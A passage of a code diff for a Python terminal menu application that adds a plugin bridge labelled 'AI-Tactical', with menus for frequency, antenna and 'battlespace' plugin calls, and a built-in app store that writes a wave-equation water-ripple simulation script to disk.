@@ -2667,7 +2735,7 @@ class UniversalInstallManager:
                 f.write(json.dumps(entry) + "\n")
         except Exception:
             pass
-    
+
     def get_system_report(self):
         """Generate comprehensive system report."""
         report = f"""
@@ -2788,6 +2856,7 @@ CONFIG_FILE = os.path.join(DB_DIR, "config.json")
 DOC_LIBRARY_DIR = os.path.join(DB_DIR, "documents")
 DYNAMIC_APPS_DIR = os.path.join(DB_DIR, "dynamic_apps")
 PYAI_SWAP_DIR = os.path.join(DB_DIR, "swap")
+PYAI_PLUGINS_DIR = os.path.join(DB_DIR, "plugins")  # For app store apps
 PYAI_PLUGIN_PATH = os.path.join(PYAI_SWAP_DIR, "pyAI.py")
 PLUGINS_DIR = os.path.join(DB_DIR, "plugins")  # Centralized plugin location
 
@@ -2834,7 +2903,7 @@ def _db_connect(*args, **kwargs):
     try:
         conn.execute("PRAGMA busy_timeout = 5000")
     except Exception as e:
-        RESILIENCE_LOGGER.log(ErrorLevel.WARNING, "PRAGMA busy_timeout failed", 
+        RESILIENCE_LOGGER.log(ErrorLevel.WARNING, "PRAGMA busy_timeout failed",
                              feature="Database", error=e)
     return conn
 
@@ -2842,9 +2911,12 @@ def safe_run(category, operation, func, *args, **kwargs):
     """Execute operation with comprehensive error handling and resilience logging."""
     try:
         return func(*args, **kwargs)
+    except KeyboardInterrupt:
+        print(f"\n{COLORS['3'][0]}⚠️ Operation cancelled by user.{RESET}")
+        return None
     except Exception as e:
         tb = traceback.format_exc()
-        
+
         # Log to resilience system
         RESILIENCE_LOGGER.log(
             ErrorLevel.ERROR,
@@ -2853,10 +2925,10 @@ def safe_run(category, operation, func, *args, **kwargs):
             error=e
         )
         RESILIENCE_LOGGER.mark_feature_failed(operation, error=e)
-        
+
         # Display error to user
         print(f"{COLORS['1'][0]}❌ Error in {operation}: {e}{RESET}")
-        
+
         # Try to save error log
         try:
             file_path = save_log_file(category, f"{operation}_Error", tb, prompt_user=False)
@@ -2898,6 +2970,7 @@ def init_database_system():
         os.makedirs(LOG_DIR, exist_ok=True)
         os.makedirs(SWAP_CACHE_DIR, exist_ok=True)
         os.makedirs(PYAI_SWAP_DIR, exist_ok=True)
+        os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
 
         # Create category subdirectories
         for category in LOG_CATEGORIES.keys():
@@ -4799,6 +4872,9 @@ active_color_key = "6"
 user_has_chosen = False
 BOLD = "\033[1m"
 RESET = "\033[0m"
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
 is_blinking = True
 stop_clock = False
 temp_unit = "C"
@@ -4927,8 +5003,174 @@ def _load_pyai_plugin():
 def _is_pyai_linked():
     return os.path.exists(PYAI_PLUGIN_PATH)
 
+# ================================================================================
+# PYAI + TACTICAL INTEGRATION SYSTEM
+# ================================================================================
+
+TACTICAL_PLUGIN_PATH = os.path.join(PYAI_SWAP_DIR, "tactical.py")
+_TACTICAL_CACHE = {"module": None, "path": None}
+
+def _load_tactical_plugin():
+    """Load the tactical.py plugin for physical world interactions."""
+    if not os.path.exists(TACTICAL_PLUGIN_PATH):
+        return None
+    if _TACTICAL_CACHE.get("module") and _TACTICAL_CACHE.get("path") == TACTICAL_PLUGIN_PATH:
+        return _TACTICAL_CACHE.get("module")
+    try:
+        spec = importlib.util.spec_from_file_location("tactical", TACTICAL_PLUGIN_PATH)
+        if spec and spec.loader:
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            _TACTICAL_CACHE["module"] = mod
+            _TACTICAL_CACHE["path"] = TACTICAL_PLUGIN_PATH
+            return mod
+    except Exception as e:
+        RESILIENCE_LOGGER.log(ErrorLevel.WARNING, f"Failed to load tactical.py: {e}",
+                             feature="Tactical_Integration")
+        return None
+    return None
+
+def _is_tactical_linked():
+    """Check if tactical.py plugin is available."""
+    return os.path.exists(TACTICAL_PLUGIN_PATH)
+
+def _get_ai_math_module():
+    """Get AI math/physics module from pyAI.py."""
+    try:
+        mod = _load_pyai_plugin()
+        if mod and hasattr(mod, 'PythonPowerOptimizer'):
+            return mod
+        return None
+    except Exception:
+        return None
+
+def _get_tactical_control_module():
+    """Get tactical control module from tactical.py."""
+    try:
+        mod = _load_tactical_plugin()
+        if mod:
+            return mod
+        return None
+    except Exception:
+        return None
+
+class AITacticalBridge:
+    """
+    Master integration bridge combining:
+    - pyAI.py: High-level math, physics, and future expansions
+    - tactical.py: Physical world interactions (robots, vehicles, weapons, satellites)
+    """
+    def __init__(self):
+        self.ai_module = _get_ai_math_module()
+        self.tactical_module = _get_tactical_control_module()
+        self.active_systems = {}
+        self.command_history = []
+
+    def is_ready(self):
+        """Check if bridge is fully operational by checking file existence."""
+        import os
+        ai_exists = os.path.exists(PYAI_PLUGIN_PATH) and os.path.getsize(PYAI_PLUGIN_PATH) > 100
+        tactical_exists = os.path.exists(TACTICAL_PLUGIN_PATH) and os.path.getsize(TACTICAL_PLUGIN_PATH) > 100
+        return bool(ai_exists and tactical_exists)
+
+    def get_status(self):
+        """Return status of both modules."""
+        import os
+        ai_exists = os.path.exists(PYAI_PLUGIN_PATH)
+        tactical_exists = os.path.exists(TACTICAL_PLUGIN_PATH)
+        return {
+            "ai_loaded": ai_exists,
+            "tactical_loaded": tactical_exists,
+            "ai_path": PYAI_PLUGIN_PATH if ai_exists else "Not installed",
+            "tactical_path": TACTICAL_PLUGIN_PATH if tactical_exists else "Not installed",
+            "ai_status": "✓ Installed" if ai_exists else "✗ Missing",
+            "tactical_status": "✓ Installed" if tactical_exists else "✗ Missing",
+            "bridge_ready": self.is_ready(),
+            "active_systems": list(self.active_systems.keys()),
+            "total_commands": len(self.command_history)
+        }
+
+    def execute_ai_calculation(self, operation, *args, **kwargs):
+        """Execute high-level calculations from pyAI.py."""
+        if not self.ai_module:
+            return {"error": "pyAI.py not loaded"}
+
+        try:
+            # Try to access common AI functions
+            if hasattr(self.ai_module, 'PythonPowerOptimizer'):
+                optimizer = self.ai_module.PythonPowerOptimizer()
+                if hasattr(optimizer, operation):
+                    result = getattr(optimizer, operation)(*args, **kwargs)
+                    self.command_history.append({"type": "ai_calc", "op": operation})
+                    return {"success": True, "result": result}
+            return {"error": f"Operation '{operation}' not found in pyAI"}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def execute_tactical_command(self, system_type, command, *args, **kwargs):
+        """Execute tactical commands for physical systems (robots, vehicles, weapons, satellites)."""
+        if not self.tactical_module:
+            return {"error": "tactical.py not loaded"}
+
+        try:
+            # Map system types to tactical module classes
+            system_map = {
+                "synthesizer": "LuffSynthesizerController",
+                "antenna": "AntennaArrayManager",
+                "battlespace": "BattlespaceProcessor",
+                "amc": "AMCHardwareSuite",
+                "nexus": "TacticalNexusPlugin"
+            }
+
+            class_name = system_map.get(system_type.lower())
+            if not class_name or not hasattr(self.tactical_module, class_name):
+                return {"error": f"System type '{system_type}' not found"}
+
+            system_class = getattr(self.tactical_module, class_name)
+            if system_type.lower() not in self.active_systems:
+                self.active_systems[system_type.lower()] = system_class()
+
+            system_instance = self.active_systems[system_type.lower()]
+
+            if hasattr(system_instance, command):
+                result = getattr(system_instance, command)(*args, **kwargs)
+                self.command_history.append({"type": "tactical", "sys": system_type, "cmd": command})
+                return {"success": True, "result": result}
+            return {"error": f"Command '{command}' not found in {system_type}"}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def execute_integrated_workflow(self, ai_operation, tactical_system, tactical_command):
+        """Execute combined AI calculation + Tactical action workflow."""
+        if not self.ai_module or not self.tactical_module:
+            return {"error": "Both pyAI.py and tactical.py required for integrated workflows"}
+
+        try:
+            # Step 1: Execute AI calculation
+            ai_result = self.execute_ai_calculation(ai_operation)
+            if "error" in ai_result:
+                return ai_result
+
+            # Step 2: Use AI result as input for tactical command
+            tactical_result = self.execute_tactical_command(tactical_system, tactical_command, ai_result.get("result"))
+
+            return {
+                "success": True,
+                "ai_result": ai_result.get("result"),
+                "tactical_result": tactical_result.get("result"),
+                "workflow_complete": True
+            }
+        except Exception as e:
+            return {"error": f"Workflow failed: {str(e)}"}
+
+# Global bridge instance
+AI_TACTICAL_BRIDGE = AITacticalBridge()
+
+
 def _dynamic_registry_path():
-    return os.path.join(_get_dynamic_apps_dir(), "registry.json")
+    """Return the path to the dynamic apps registry file."""
+    return os.path.expanduser("~/.pythonOS/dynamic_registry.json")
+
 
 def _load_dynamic_registry():
     path = _dynamic_registry_path()
@@ -5302,6 +5544,983 @@ def feature_ram_drive():
             print(f"{COLORS['1'][0]}pyAI install failed.{RESET}")
     input("\nPress Enter to continue...")
 
+# ================================================================================
+# AI-TACTICAL INTEGRATION FEATURES
+# ================================================================================
+
+def feature_ai_tactical_status():
+    """Display comprehensive status of AI and Tactical modules."""
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print_header("🤖 AI-TACTICAL INTEGRATION STATUS")
+
+        status = AI_TACTICAL_BRIDGE.get_status()
+
+        # AI Module Status
+        ai_status = "✅ ONLINE" if status["ai_loaded"] else "❌ OFFLINE"
+        print(f"\n{BOLD}pyAI.py (Physics & Math Accelerator):{RESET}")
+        print(f"  Status: {ai_status}")
+        print(f"  Path: {status['ai_path']}")
+
+        # Tactical Module Status
+        tactical_status = "✅ ONLINE" if status["tactical_loaded"] else "❌ OFFLINE"
+        print(f"\n{BOLD}tactical.py (Physical World Control):{RESET}")
+        print(f"  Status: {tactical_status}")
+        print(f"  Path: {status['tactical_path']}")
+
+        # Bridge Status
+        bridge_status = "🔗 CONNECTED" if AI_TACTICAL_BRIDGE.is_ready() else "⚠️ DISCONNECTED"
+        print(f"\n{BOLD}Bridge Status: {bridge_status}{RESET}")
+
+        # Active Systems
+        if status["active_systems"]:
+            print(f"\n{BOLD}Active Systems:{RESET}")
+            for sys in status["active_systems"]:
+                print(f"  • {sys}")
+        else:
+            print(f"\n{BOLD}Active Systems:{RESET} None")
+
+        # Command History
+        print(f"\n{BOLD}Total Commands Executed: {status['total_commands']}{RESET}")
+
+        # Options
+        print(f"\n{BOLD}OPTIONS:{RESET}")
+        print(f" [1] Install pyAI.py")
+        print(f" [2] Install tactical.py")
+        print(f" [3] Test Integrated Workflow")
+        print(f" [4] View Command History")
+        print(f" [5] 📦 APP STORE - Download Physics Apps")
+        print(f" [0] Return")
+
+        choice = input(f"\n{BOLD}Select option: {RESET}").strip()
+
+        if choice == '0':
+            return
+        elif choice == '1':
+            if not _is_pyai_linked():
+                path = _install_pyai_plugin()
+                if path:
+                    print(f"{COLORS['2'][0]}✓ pyAI installed at: {path}{RESET}")
+                    AI_TACTICAL_BRIDGE.ai_module = _get_ai_math_module()
+                else:
+                    print(f"{COLORS['1'][0]}✗ pyAI installation failed{RESET}")
+            else:
+                print(f"{COLORS['3'][0]}pyAI is already installed{RESET}")
+            input("\nPress Enter...")
+        elif choice == '2':
+            if not _is_tactical_linked():
+                os.makedirs(PYAI_SWAP_DIR, exist_ok=True)
+                print(f"{COLORS['4'][0]}📍 tactical.py should be placed at: {TACTICAL_PLUGIN_PATH}{RESET}")
+                print(f"{COLORS['3'][0]}Copy tactical.py to the directory above and it will be auto-loaded.{RESET}")
+                input("\nPress Enter...")
+            else:
+                print(f"{COLORS['3'][0]}✓ tactical.py is already installed{RESET}")
+                input("\nPress Enter...")
+        elif choice == '3':
+            _test_integrated_workflow()
+        elif choice == '4':
+            _view_command_history()
+        elif choice == '5':
+            search_and_download_app()
+
+def _test_integrated_workflow():
+    """Test integrated AI + Tactical workflow."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_header("🔄 INTEGRATED WORKFLOW TEST")
+
+    if not AI_TACTICAL_BRIDGE.ai_module and not AI_TACTICAL_BRIDGE.tactical_module:
+        print(f"\n{COLORS['1'][0]}❌ Neither pyAI.py nor tactical.py is loaded.{RESET}")
+        print(f"{COLORS['3'][0]}Please install both modules to test integrated workflows.{RESET}")
+        input("\nPress Enter...")
+        return
+
+    print(f"\n{BOLD}Available Operations:{RESET}")
+    print(f" [1] Execute AI Calculation Only")
+    print(f" [2] Execute Tactical Command Only")
+    print(f" [3] Execute Integrated Workflow (AI + Tactical)")
+    print(f" [0] Return")
+
+    choice = input(f"\n{BOLD}Select: {RESET}").strip()
+
+    if choice == '0':
+        return
+    elif choice == '1':
+        if not AI_TACTICAL_BRIDGE.ai_module:
+            print(f"{COLORS['1'][0]}pyAI.py not loaded{RESET}")
+            input("\nPress Enter...")
+            return
+
+        print(f"\n{BOLD}AI Operations (examples):{RESET}")
+        print(f" [1] optimize_computation")
+        print(f" [2] predict_performance")
+        print(f" [3] analyze_patterns")
+
+        op_choice = input(f"\n{BOLD}Select operation: {RESET}").strip()
+
+        if op_choice in ['1', '2', '3']:
+            ops = ['optimize_computation', 'predict_performance', 'analyze_patterns']
+            result = AI_TACTICAL_BRIDGE.execute_ai_calculation(ops[int(op_choice)-1])
+            print(f"\n{BOLD}Result:{RESET}")
+            print(json.dumps(result, indent=2))
+
+    elif choice == '2':
+        if not AI_TACTICAL_BRIDGE.tactical_module:
+            print(f"{COLORS['1'][0]}tactical.py not loaded{RESET}")
+            input("\nPress Enter...")
+            return
+
+        print(f"\n{BOLD}Tactical Systems:{RESET}")
+        print(f" [1] Synthesizer (Frequency Control)")
+        print(f" [2] Antenna (Beamsteering)")
+        print(f" [3] Battlespace (Monitoring)")
+        print(f" [4] AMC (Hardware Protection)")
+        print(f" [5] Nexus (Full Integration)")
+
+        sys_choice = input(f"\n{BOLD}Select system: {RESET}").strip()
+
+        system_map = {
+            '1': ('synthesizer', 'set_frequency', [12.4]),
+            '2': ('antenna', 'steer_beam', [184.5]),
+            '3': ('battlespace', 'run_automated_monitoring', []),
+            '4': ('amc', 'protect_circuit', []),
+            '5': ('nexus', 'execute_tactical_sweep', [])
+        }
+
+        if sys_choice in system_map:
+            sys_type, cmd, args = system_map[sys_choice]
+            result = AI_TACTICAL_BRIDGE.execute_tactical_command(sys_type, cmd, *args)
+            print(f"\n{BOLD}Result:{RESET}")
+            print(json.dumps(result, indent=2, default=str))
+
+    elif choice == '3':
+        if not (AI_TACTICAL_BRIDGE.ai_module and AI_TACTICAL_BRIDGE.tactical_module):
+            print(f"{COLORS['1'][0]}Both modules required for integrated workflows{RESET}")
+            input("\nPress Enter...")
+            return
+
+        result = AI_TACTICAL_BRIDGE.execute_integrated_workflow(
+            'optimize_computation',
+            'antenna',
+            'steer_beam'
+        )
+        print(f"\n{BOLD}Integrated Workflow Result:{RESET}")
+        print(json.dumps(result, indent=2, default=str))
+
+    input("\nPress Enter...")
+
+def _view_command_history():
+    """Display command execution history."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_header("📜 COMMAND HISTORY")
+
+    if not AI_TACTICAL_BRIDGE.command_history:
+        print(f"\n{COLORS['3'][0]}No commands executed yet{RESET}")
+        input("\nPress Enter...")
+        return
+
+    print(f"\n{BOLD}Total Commands: {len(AI_TACTICAL_BRIDGE.command_history)}{RESET}\n")
+
+    for i, cmd in enumerate(AI_TACTICAL_BRIDGE.command_history, 1):
+        cmd_type = cmd.get("type", "unknown")
+        if cmd_type == "ai_calc":
+            print(f"{i}. [AI] Operation: {cmd.get('op')}")
+        elif cmd_type == "tactical":
+            print(f"{i}. [TACTICAL] {cmd.get('sys')}.{cmd.get('cmd')}()")
+
+    input("\nPress Enter...")
+
+def feature_ai_tactical_control_panel():
+    """Interactive control panel for AI-Tactical operations."""
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print_header("🎛️ AI-TACTICAL CONTROL PANEL")
+
+        print(f"\n{BOLD}AI Status:{RESET} {'✅ Ready' if AI_TACTICAL_BRIDGE.ai_module else '❌ Not available'}")
+        print(f"{BOLD}Tactical Status:{RESET} {'✅ Ready' if AI_TACTICAL_BRIDGE.tactical_module else '❌ Not available'}")
+        print(f"{BOLD}Bridge Status:{RESET} {'🔗 Connected' if AI_TACTICAL_BRIDGE.is_ready() else '⚠️ Offline'}")
+
+        print(f"\n{BOLD}MENU:{RESET}")
+        print(f" [1] 🤖 AI Module Control")
+        print(f" [2] 🎯 Tactical System Control")
+        print(f" [3] 🔄 Integrated Operations")
+        print(f" [4] 📊 System Status & Diagnostics")
+        print(f" [5] 📜 Command History & Analytics")
+        print(f" [0] Return to Main Menu")
+
+        choice = input(f"\n{BOLD}Select option: {RESET}").strip()
+
+        if choice == '0':
+            return
+        elif choice == '1':
+            _ai_module_control()
+        elif choice == '2':
+            _tactical_system_control()
+        elif choice == '3':
+            _integrated_operations_menu()
+        elif choice == '4':
+            feature_ai_tactical_status()
+        elif choice == '5':
+            _view_command_history()
+
+def _ai_module_control():
+    """Control panel for AI module operations."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_header("🤖 AI MODULE CONTROL")
+
+    if not AI_TACTICAL_BRIDGE.ai_module:
+        print(f"\n{COLORS['1'][0]}❌ pyAI.py not loaded{RESET}")
+        input("\nPress Enter...")
+        return
+
+    print(f"\n{BOLD}Available AI Operations:{RESET}")
+    print(f" [1] Optimize Computation")
+    print(f" [2] Predict Performance")
+    print(f" [3] Analyze Patterns")
+    print(f" [4] Advanced Math Calculation")
+    print(f" [5] Physics Simulation")
+    print(f" [0] Return")
+
+    choice = input(f"\n{BOLD}Select: {RESET}").strip()
+
+    if choice != '0' and choice in ['1', '2', '3', '4', '5']:
+        ops = ['optimize_computation', 'predict_performance', 'analyze_patterns', 'advanced_math', 'physics_sim']
+        result = AI_TACTICAL_BRIDGE.execute_ai_calculation(ops[int(choice)-1])
+        print(f"\n{BOLD}Operation Result:{RESET}")
+        print(json.dumps(result, indent=2, default=str))
+        input("\nPress Enter...")
+
+def _tactical_system_control():
+    """Control panel for tactical systems."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_header("🎯 TACTICAL SYSTEM CONTROL")
+
+    if not AI_TACTICAL_BRIDGE.tactical_module:
+        print(f"\n{COLORS['1'][0]}❌ tactical.py not loaded{RESET}")
+        input("\nPress Enter...")
+        return
+
+    print(f"\n{BOLD}Available Tactical Systems:{RESET}")
+    print(f" [1] 📡 Frequency Synthesizer (Luff)")
+    print(f" [2] 🎯 Antenna Array (Alaris Cojot)")
+    print(f" [3] 🌐 Battlespace Processor (TCI/ECS)")
+    print(f" [4] 🛡️ AMC Hardware Suite")
+    print(f" [5] ⚡ Tactical Nexus (Full Integration)")
+    print(f" [0] Return")
+
+    choice = input(f"\n{BOLD}Select system: {RESET}").strip()
+
+    system_commands = {
+        '1': ('synthesizer', [('set_frequency', [12.4]), ('get_status', [])]),
+        '2': ('antenna', [('steer_beam', [184.5]), ('get_position', [])]),
+        '3': ('battlespace', [('run_automated_monitoring', []), ('get_data', [])]),
+        '4': ('amc', [('protect_circuit', []), ('get_status', [])]),
+        '5': ('nexus', [('execute_tactical_sweep', [])])
+    }
+
+    if choice in system_commands:
+        sys_type, commands = system_commands[choice]
+        print(f"\n{BOLD}Available Commands for {sys_type}:{RESET}")
+        for i, (cmd, _) in enumerate(commands, 1):
+            print(f" [{i}] {cmd}")
+
+        cmd_choice = input(f"\n{BOLD}Select command: {RESET}").strip()
+        if cmd_choice.isdigit() and 1 <= int(cmd_choice) <= len(commands):
+            cmd_name, cmd_args = commands[int(cmd_choice)-1]
+            result = AI_TACTICAL_BRIDGE.execute_tactical_command(sys_type, cmd_name, *cmd_args)
+            print(f"\n{BOLD}Command Result:{RESET}")
+            print(json.dumps(result, indent=2, default=str))
+            input("\nPress Enter...")
+
+def _integrated_operations_menu():
+    """Menu for integrated AI + Tactical operations."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_header("🔄 INTEGRATED OPERATIONS")
+
+    if not (AI_TACTICAL_BRIDGE.ai_module and AI_TACTICAL_BRIDGE.tactical_module):
+        print(f"\n{COLORS['1'][0]}❌ Both modules required{RESET}")
+        input("\nPress Enter...")
+        return
+
+    print(f"\n{BOLD}Integrated Workflows:{RESET}")
+    print(f" [1] AI Calculation → Tactical Beam Steering")
+    print(f" [2] AI Physics → Tactical Battlespace Control")
+    print(f" [3] AI Optimization → Tactical Frequency Lock")
+    print(f" [4] Execute Full Tactical Sweep with AI Analysis")
+    print(f" [0] Return")
+
+    choice = input(f"\n{BOLD}Select workflow: {RESET}").strip()
+
+    workflows = {
+        '1': ('optimize_computation', 'antenna', 'steer_beam'),
+        '2': ('predict_performance', 'battlespace', 'run_automated_monitoring'),
+        '3': ('analyze_patterns', 'synthesizer', 'set_frequency'),
+        '4': ('optimize_computation', 'nexus', 'execute_tactical_sweep')
+    }
+
+    if choice in workflows:
+        ai_op, tac_sys, tac_cmd = workflows[choice]
+        result = AI_TACTICAL_BRIDGE.execute_integrated_workflow(ai_op, tac_sys, tac_cmd)
+        print(f"\n{BOLD}Workflow Result:{RESET}")
+        print(json.dumps(result, indent=2, default=str))
+
+    input("\nPress Enter...")
+
+# --- APP STORE: DOWNLOAD AND INSTALL APPLICATIONS ---
+
+def discover_installed_apps():
+    """Discover and return list of installed app store apps."""
+    installed_apps = {}
+    app_names = {
+        'water_physics.py': 'Water Physics Simulator',
+        'wind_tunnel.py': 'Wind Tunnel Simulator',
+        'quantum_lab.py': 'Quantum Mechanics Lab',
+        'military_suite.py': 'Military Applications Suite',
+        'fluid_dynamics.py': 'Fluid Dynamics Engine'
+    }
+
+    if os.path.exists(PYAI_PLUGINS_DIR):
+        for filename in os.listdir(PYAI_PLUGINS_DIR):
+            if filename in app_names:
+                filepath = os.path.join(PYAI_PLUGINS_DIR, filename)
+                file_size = os.path.getsize(filepath)
+                installed_apps[filename] = {
+                    'name': app_names[filename],
+                    'path': filepath,
+                    'size': file_size
+                }
+
+    return installed_apps
+
+def show_installed_apps():
+    """Display installed app store applications."""
+    installed = discover_installed_apps()
+
+    print(f"\n{BOLD}{'='*70}{RESET}")
+    print(f"{BOLD}📦 INSTALLED APP STORE APPLICATIONS{RESET}")
+    print(f"{BOLD}{'='*70}{RESET}")
+
+    if not installed:
+        print(f"\n{YELLOW}No app store applications installed yet.{RESET}")
+        print(f"Select [5] from the APP STORE to download apps.")
+        input(f"\nPress Enter to continue...")
+        return
+
+    print(f"\n{GREEN}✓ Found {len(installed)} installed app(s):{RESET}\n")
+
+    for idx, (filename, app_info) in enumerate(installed.items(), 1):
+        print(f"{BOLD}[{idx}]{RESET} {app_info['name']}")
+        print(f"    File: {filename}")
+        print(f"    Path: {app_info['path']}")
+        print(f"    Size: {app_info['size']:,} bytes")
+        print()
+
+    print(f"{BOLD}How to Run:{RESET}")
+    print(f"    cd {PYAI_PLUGINS_DIR}")
+    print(f"    python <app_name>.py")
+    print()
+
+    print(f"{BOLD}Example:{RESET}")
+    if 'water_physics.py' in installed:
+        print(f"    python water_physics.py")
+    elif 'quantum_lab.py' in installed:
+        print(f"    python quantum_lab.py")
+
+    input(f"\nPress Enter to continue...")
+
+def search_and_download_app():
+    """App store with download and management options."""
+    while True:
+        print(f"\n{BOLD}{'='*70}{RESET}")
+        print(f"{BOLD}📦 APP STORE - Physics & Scientific Applications{RESET}")
+        print(f"{BOLD}{'='*70}{RESET}")
+
+        # Check installed count
+        installed = discover_installed_apps()
+        installed_count = len(installed)
+
+        print(f"\n{BOLD}Menu:{RESET}")
+        print(f"[1] Download & Install Apps ({installed_count} installed)")
+        print(f"[2] View Installed Apps")
+        print(f"[3] App Store Info")
+        print(f"[0] Return to Main Menu")
+
+        menu_choice = input(f"\n{BOLD}Select option: {RESET}").strip()
+
+        if menu_choice == '1':
+            show_available_apps()
+        elif menu_choice == '2':
+            show_installed_apps()
+        elif menu_choice == '3':
+            show_app_store_info()
+        elif menu_choice == '0':
+            return
+        else:
+            print(f"{RED}Invalid selection{RESET}")
+
+def show_available_apps():
+    """Display available apps for download."""
+    apps = {
+        '1': {
+            'name': 'Water Physics Simulator',
+            'description': 'Real-time water ripple simulation using wave equations',
+            'category': 'Physics Simulation',
+            'code_length': 'Short',
+            'difficulty': 'Intermediate'
+        },
+        '2': {
+            'name': 'Wind Tunnel Simulator',
+            'description': 'Aerodynamic flow visualization and analysis',
+            'category': 'Physics Simulation',
+            'code_length': 'Medium',
+            'difficulty': 'Advanced'
+        },
+        '3': {
+            'name': 'Quantum Mechanics Lab',
+            'description': 'Wave functions and quantum simulations',
+            'category': 'Physics',
+            'code_length': 'Long',
+            'difficulty': 'Advanced'
+        },
+        '4': {
+            'name': 'Military Applications Suite',
+            'description': 'Python applications in military: drone analysis, cyber-security, ballistics',
+            'category': 'Defense Tech',
+            'code_length': 'Long',
+            'difficulty': 'Advanced'
+        },
+        '5': {
+            'name': 'Fluid Dynamics Engine',
+            'description': 'CFD simulations and flow analysis',
+            'category': 'Physics',
+            'code_length': 'Very Long',
+            'difficulty': 'Expert'
+        }
+    }
+
+    print(f"\n{BOLD}{'='*70}{RESET}")
+    print(f"{BOLD}Download Physics & Scientific Applications{RESET}")
+    print(f"{BOLD}{'='*70}{RESET}")
+
+    print(f"\n{BOLD}Available Applications:{RESET}")
+    for key, app in apps.items():
+        print(f"\n{BOLD}[{key}]{RESET} {app['name']}")
+        print(f"    Description: {app['description']}")
+        print(f"    Category: {app['category']} | Difficulty: {app['difficulty']}")
+
+    choice = input(f"\n{BOLD}Select app to download (1-5) or 'q' to cancel: {RESET}").strip()
+
+    if choice == 'q':
+        return
+
+    if choice not in apps:
+        print(f"{RED}Invalid selection{RESET}")
+        return
+
+    app = apps[choice]
+    print(f"\n{BOLD}Downloading: {app['name']}...{RESET}")
+
+    if choice == '1':
+        install_water_physics_app()
+    elif choice == '2':
+        install_wind_tunnel_app()
+    elif choice == '3':
+        install_quantum_lab_app()
+    elif choice == '4':
+        install_military_suite_app()
+    elif choice == '5':
+        install_fluid_dynamics_app()
+
+def show_app_store_info():
+    """Show app store information and statistics."""
+    installed = discover_installed_apps()
+    installed_count = len(installed)
+    total_size = sum(app['size'] for app in installed.values())
+
+    print(f"\n{BOLD}{'='*70}{RESET}")
+    print(f"{BOLD}📊 APP STORE INFORMATION{RESET}")
+    print(f"{BOLD}{'='*70}{RESET}")
+
+    print(f"\n{BOLD}Statistics:{RESET}")
+    print(f"  • Total Available Apps: 5")
+    print(f"  • Installed Apps: {installed_count}")
+    print(f"  • Total Installed Size: {total_size:,} bytes")
+    print(f"  • Installation Location: {PYAI_PLUGINS_DIR}")
+
+    print(f"\n{BOLD}Features:{RESET}")
+    print(f"  ✓ One-click installation")
+    print(f"  ✓ No external downloads required")
+    print(f"  ✓ Full source code included")
+    print(f"  ✓ Educational & research-ready")
+    print(f"  ✓ Physics simulations with visualization")
+
+    print(f"\n{BOLD}Supported Categories:{RESET}")
+    print(f"  • Physics Simulations (3 apps)")
+    print(f"  • Defense Technology (1 app)")
+    print(f"  • Advanced Algorithms (2 apps)")
+
+    input(f"\nPress Enter to continue...")
+
+
+def install_water_physics_app():
+    """Install water physics simulation app."""
+    print(f"\n{BOLD}Installing Water Physics Simulator...{RESET}\n")
+
+    water_physics_code = '''#!/usr/bin/env python3
+"""Water Physics Simulator - Wave Equation Simulation"""
+import numpy
+from matplotlib import pyplot
+from matplotlib import cm
+from mpl_toolkits.mplot3d import Axes3D
+
+print("Initializing Water Physics Simulator...")
+
+# Domain parameters
+Lx = 10  # total width of the pool
+Nx = 80  # amount of points in the x direction
+Ly = 10  # total height of the pool
+Ny = 80  # amount of points in the y direction
+
+# Create mesh
+x_vec = numpy.linspace(0, Lx, Nx)
+dx = x_vec[1] - x_vec[0] if len(x_vec) > 1 else 1
+
+y_vec = numpy.linspace(0, Ly, Ny)
+dy = y_vec[1] - y_vec[0] if len(y_vec) > 1 else 1
+
+# Time parameters
+dt = 0.025  # time step
+Nt = 4000   # number of iterations
+c = 1       # wave speed
+
+# Initialize solution array
+u = numpy.zeros([Nt, len(x_vec), len(y_vec)])
+
+# Initial conditions
+u[0, Nx // 2, Ny // 2] = numpy.sin(0)
+u[1, Nx // 2, Ny // 2] = numpy.sin(1/10)
+
+print(f"Simulating {Nt} time steps...")
+print("Progress: ", end="")
+
+# Main simulation loop using wave equation
+for t in range(1, Nt-1):
+    if t % (Nt // 20) == 0:
+        print(f"{(t*100//Nt)}%...", end="", flush=True)
+
+    for x in range(1, Nx-1):
+        for y in range(1, Ny-1):
+            # Apply source disturbance
+            if t < 100:
+                u[t, Nx // 2, Ny // 2] = numpy.sin(t / 10)
+
+            # Wave equation update
+            u[t+1, x, y] = (c**2 * dt**2 *
+                           (((u[t, x+1, y] - 2*u[t, x, y] + u[t, x-1, y])/(dx**2)) +
+                            ((u[t, x, y+1] - 2*u[t, x, y] + u[t, x, y-1])/(dy**2))) +
+                           2*u[t, x, y] - u[t-1, x, y])
+
+print("100%")
+print("Rendering animation...")
+
+# Visualization
+fig = pyplot.figure(figsize=(10, 8))
+ax = fig.add_subplot(111, projection='3d')
+X, Y = numpy.meshgrid(x_vec, y_vec)
+
+for t in range(0, Nt):
+    if t % 10 == 0:
+        print(f"Frame {t}/{Nt}", end="\\r")
+
+    ax.clear()
+    surf = ax.plot_surface(X, Y, u[t], cmap='viridis',
+                          linewidth=0, antialiased=False)
+
+    ax.view_init(elev=45)
+    ax.set_zlim(-0.0001, 2.4)
+    ax.set_title(f'Water Ripple Simulation - Time: {t*dt:.2f}s')
+    pyplot.axis('off')
+
+    pyplot.pause(0.0001)
+
+pyplot.show()
+print("\\nSimulation complete!")
+'''
+
+    os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
+    app_path = os.path.join(PYAI_PLUGINS_DIR, "water_physics.py")
+    try:
+        with open(app_path, 'w') as f:
+            f.write(water_physics_code)
+        print(f"{BOLD}✓ Successfully installed to: {app_path}{RESET}")
+        print(f"\n{BOLD}To run:{RESET} python water_physics.py")
+        print(f"{BOLD}Requirements:{RESET} numpy, matplotlib")
+    except Exception as e:
